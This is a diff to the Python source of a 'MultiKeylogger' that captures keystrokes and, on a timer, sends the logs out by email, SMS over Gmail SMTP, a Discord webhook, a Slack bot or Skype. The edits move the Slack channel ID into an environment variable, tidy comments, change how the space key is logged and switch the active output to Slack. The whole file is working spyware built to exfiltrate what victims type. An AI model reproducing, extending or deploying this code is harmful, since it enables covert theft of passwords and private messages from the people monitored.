@@ -4,7 +4,7 @@ import smtplib # Imported to provide the ability to send the recorded key logs t
 
 from threading import Timer # Intended to make it possible to send reports have a set period of time
 from datetime import datetime # Imported to retrieve the current date times at certain periods of time
-from email import message # Imported to format emails for sending keylohs
+from email import message # Imported to format emails for sending keylogs
 
 from asyncio.windows_events import NULL
 from slack_sdk import WebClient # Imported to use Slack development
@@ -17,6 +17,7 @@ import requests
 
 load_dotenv() # Loads environment to use variable in .env
 SLACK_BOT_TOKEN = os.environ['SLACK_BOT_TOKEN']
+SLACK_CHANNEL_ID = os.environ['SLACK_CHANNEL_ID']
 slackBot = WebClient(SLACK_BOT_TOKEN)
 
 DISCORD_URL = os.environ['DISCORD_WEBHOOK'] # Creats variable from .env discord webhook url
@@ -66,7 +67,7 @@ class MultiKeylogger:
 
     def reportSlack(self, postHeader):
             slackPost = postHeader + "\n" + self.keylog # Creates a string variable with the log time interval as the first line and the contents as the body of the post
-            slackBot.chat_postMessage(channel = "C036JLKMVR6", text = slackPost) # The slack posts the string variable in the specified channel
+            slackBot.chat_postMessage(channel = SLACK_CHANNEL_ID, text = slackPost) # The slack posts the string variable in the specified channel
             
     def reportSMS(self, address, password, textBody):
         text = smtplib.SMTP(host = "smtp.gmail.com", port = 587) # Port 587 is used encrypt SMTP messages using TLS
@@ -107,16 +108,14 @@ class MultiKeylogger:
             elif eventName == "[enter]":
                 eventName = "[enter]\n" # Replaces [ENTER] with [ENTER] and a creates a new line afterward              
             elif eventName == "[space]":
-                eventName = " " # Replaces [SPACE] with " " for readability
-            elif eventName == "[decimal]":
-                eventName = "." # Replaces [DECIMAL] with "." for readability
+                eventName = "[space] " # Replaces [SPACE] with " " for readability
         self.keylog = self.keylog + eventName # Updates the self.keylog variable with the eventName
 
     def reportKeyLog(self):
         if self.keylog: # Checks if self.keylong contains any data and execute the below statements if it does
             self.endTimeVal = datetime.now() # Retrieves the end datetime for utilization in file identifying
-            self.createFileIdentifier() # Execute the function that creates the file id/name
-            self.createID() # Execute the function createId for report types other than file
+            self.createFileIdentifier() # Executes the function that creates the file id/name
+            self.createID() # Executes the function createId for report types other than file
 
             if self.reportType == "File":
                 self.reportFile() # Calls the reportFile function to create a file for keylog recording
@@ -150,8 +149,8 @@ if __name__ == "__main__":
         """
         #multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "Email")
         #multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "File")
-        multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "Discord")
-        #multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "Slack")
+        #multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "Discord")
+        multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "Slack")
         #multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "SMS")
         #multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = "Skype")
         multiKeylogger.start()
